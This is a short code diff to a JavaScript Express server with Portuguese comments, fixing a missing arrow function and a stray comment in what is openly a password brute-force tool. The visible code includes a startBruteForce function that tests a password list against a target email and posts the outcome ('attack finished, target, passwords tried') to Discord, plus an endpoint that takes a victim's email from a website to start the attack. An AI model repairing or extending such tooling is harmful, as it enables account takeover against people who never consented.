@@ -125,10 +125,10 @@ async function startBruteForce(email) {
     if (!found) {
         await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}\n*Nenhuma senha da lista funcionou.*`);
     }
-} // <--- VERIFICAR SE ESTA CHAVE FECHA A FUNÇÃO startBruteForce
+}
 
 // ENDPOINT: Receber o Email do Site e Iniciar o Ataque
-app.post('/start-brute-force', async (req, res) {
+app.post('/start-brute-force', async (req, res) => {
     const { email } = req.body;
 
     if (!email || !email.includes('@')) {
